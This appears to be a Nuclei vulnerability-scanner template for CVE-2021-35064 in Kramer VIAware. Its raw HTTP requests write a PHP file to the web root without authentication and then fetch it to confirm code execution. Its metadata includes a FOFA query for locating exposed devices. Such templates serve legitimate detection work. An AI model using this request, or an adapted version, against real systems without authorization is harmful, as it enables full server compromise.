http:
- matchers:
  - part: body_2
    type: word
    words:
    - 44f63b292601ec4ab0d8c3244c9f5ebe
  raw:
  - 'POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    radioBtnVal=%3C%3Fphp+echo+md5%28%22CVE-2021-35064%22%29%3B+%3F%3E&associateFileName=%2Fvar%2Fwww%2Fhtml%2F{{randstr}}.php

    '
  - 'GET /{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-35064
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:kramerav:viaware:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-35064
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-269
    epss-percentile: 0.9918
    epss-score: 0.82326
  description: 'Kramer VIAware, all tested versions, allow privilege escalation and
    remote code execution due to misconfigured sudo permissions. Attackers can execute
    arbitrary system commands remotely if the web interface is accessible, due to
    vulnerabilities in the handling of privileged operations through ajaxPages/writeBrowseFilePathAjax.php
    and improper sudoers configurations.

    '
  impact: 'Unauthenticated attackers can execute arbitrary PHP code via file upload,
    leading to complete server compromise and control over the Kramer VIAware system.

    '
  metadata:
    fofa-query: icon_hash="1521468900"
    max-request: 2
    product: viaware
    vendor: kramerav
  name: Kramer VIAware - Privilege Escalation and Remote Code Execution
  reference:
  - http://packetstormsecurity.com/files/166623/Kramer-VIAware-Remote-Code-Execution.html
  - https://www.kramerav.com/us/product/viaware
  - https://www.exploit-db.com/exploits/50856
  - https://write-up.github.io/kramerav/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-35064
  remediation: 'Apply the latest firmware update provided by Kramer to fix misconfigured
    sudoers permissions and ensure proper validation in the web interface.

    '
  severity: critical
  tags: cve2021,cve,viaware,kramer,edb,rce,intrusive,kramerav,vkev,vuln
variables:
  useragent: '{{rand_base(6)}}'
